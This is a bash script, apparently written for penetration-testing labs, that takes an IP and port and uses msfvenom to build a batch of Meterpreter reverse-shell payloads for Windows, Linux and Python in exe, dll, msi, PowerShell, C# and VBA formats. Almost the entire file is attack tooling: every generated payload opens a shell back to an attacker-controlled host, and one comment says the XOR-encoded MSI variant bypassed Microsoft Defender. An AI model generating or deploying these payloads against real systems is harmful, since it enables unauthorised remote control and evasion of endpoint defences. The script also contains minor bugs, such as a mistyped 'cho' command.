#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <IP> <PORT>"
    echo ""
    echo "This script will take those two arguments, and generate a suite of msfvenom payloads to use"
    exit 1
fi

ip=$1
port=$2

# Make our output directories
mkdir raw
mkdir csharp
mkdir powershell
mkdir vbapplication
mkdir exe
mkdir dll
mkdir elf
mkdir python
mkdir msi

# ========================================= reverse_tcp 32-bit ========================================= #

echo ""
echo "================================================================================================"
echo "#          Generating /windows/meterpreter/reverse_tcp payloads (for 32-bit Windows)           #"
echo "================================================================================================"
echo ""

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/reverse_tcp-x32-vpapplication.txt > /dev/null 2>&1
echo "[+] Finished 32-bit vbapplication payload!"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f csharp -o csharp/reverse_tcp-x32-csharp.txt > /dev/null 2>&1
echo "[+] Finished 32-bit csharp payload!"

echo ""
echo "[*] Finished /windows/meterpreter/reverse_tcp payloads!"

# ========================================= reverse-https 32-bit ========================================= #

echo ""
echo "================================================================================================"
echo "#         Generating /windows/meterpreter/reverse_https payloads (for 32-bit Windows)          #"
echo "================================================================================================ "
echo ""

msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/reverse_https-x32-vpapplication.txt > /dev/null 2>&1
echo "[+] Finished 32-bit vbapplication payload!"

msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f csharp -o csharp/reverse_https-x32-csharp.txt > /dev/null 2>&1
echo "[+] Finished 32-bit csharp payload!"

echo ""
echo "[*] Finished /windows/meterpreter/reverse_https payloads!"

# ========================================= reverse_tcp 64-bit ========================================= #

echo ""
echo "================================================================================================"
echo "#                  Generating /windows/x64/meterpreter/reverse_tcp payloads                    #"
echo "================================================================================================"
echo ""

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f raw -o raw/reverse_tcp-x64-raw.bin > /dev/null 2>&1
echo "[+] Finished raw payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f csharp -o csharp/reverse_tcp-x64-csharp.txt > /dev/null 2>&1
echo "[+] Finished csharp payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f ps1 -o powershell/reverse_tcp-x64-ps1.ps1 > /dev/null 2>&1
echo "[+] Finished powershell payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/reverse_tcp-x64-vbapplication.txt > /dev/null 2>&1
echo "[+] Finished vbapplication payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f exe -o exe/reverse_tcp-x64.exe > /dev/null 2>&1
echo "[+] Finished exe payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port EXITFUNC=thread -f dll -o dll/reverse_tcp-x64-dll.dll > /dev/null 2>&1
echo "[+] Finished dll payload!"

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f msi EXITFUNC=thread -e x64/xor_dynamic -o msi/reverse_tcp-x64-msi.msi > /dev/null 2>&1
echo "[+] Finished msi payload!"
echo "    [!] This payload uses -e x64/xor_dynamic (bypassed Defender in the labs)!"

echo ""
echo "[*] Finished /windows/x64/meterpreter/reverse_tcp payloads!"

# ========================================= reverse-https 64-bit ========================================= #

echo ""
echo "================================================================================================"
echo "#                    Generating /windows/x64/meterpreter/reverse_https payloads                #"
echo "================================================================================================"
echo ""

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f raw -o raw/reverse_https-x64-raw.bin > /dev/null 2>&1
echo "[+] Finished raw payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f csharp -o csharp/reverse_https-x64-csharp.txt > /dev/null 2>&1
echo "[+] Finished csharp payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f ps1 -o powershell/reverse_https-x64-ps1.ps1 > /dev/null 2>&1
echo "[+] Finished powershell payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f vbapplication -o vbapplication/reverse_https-x64-vbapplication.txt > /dev/null 2>&1
echo "[+] Finished vbapplication payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f exe -o exe/reverse_https-x64-exe.exe > /dev/null 2>&1
echo "[+] Finished exe payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port EXITFUNC=thread -f dll -o dll/reverse_https-x64-dll.dll > /dev/null 2>&1
echo "[+] Finished dll payload!"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=$port -f msi EXITFUNC=thread -e x64/xor_dynamic -o msi/reverse_https-x64-msi.msi > /dev/null 2>&1
echo "[+] Finished msi payload!"
echo "    [!] This payload uses -e x64/xor_dynamic (bypassed Defender in the labs)!"

echo ""
echo "[*] Finished /windows/x64/meterpreter/reverse_https payloads!"
echo "    [!] There is no reverse_https payload for ELF!"

# ========================================= elf ========================================= #

cho ""
echo "================================================================================================"
echo "#                     Generating linux/x64/meterpreter/reverse_tcp payloads                    #"
echo "================================================================================================"
echo ""

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf -o elf/reverse_tcp-x64-elf > /dev/null 2>&1
echo "[+] Finished ELF payload!"

echo ""
echo "[*] Finished linux/x64/meterpreter/reverse_tcp payloads!"
echo "    [!] There is no reverse_https payload for ELF!"

# ========================================= python ========================================= #

echo ""
echo "================================================================================================"
echo "#                    Generating python/meterpreter/reverse_tcp_ssl payloads                    #"
echo "================================================================================================"
echo ""

msfvenom -p python/meterpreter/reverse_tcp_ssl LHOST=$ip LPORT=$port -f raw -o python/reverse_tcp_ssl.py > /dev/null 2>&1
echo "[+] Finished Python payload!"

echo ""
echo "[*] Finished python/meterpreter/reverse_tcp_ssl payloads!"

echo ""
echo "[!] The payloads are complete!"
echo "    Happy Hunting!!"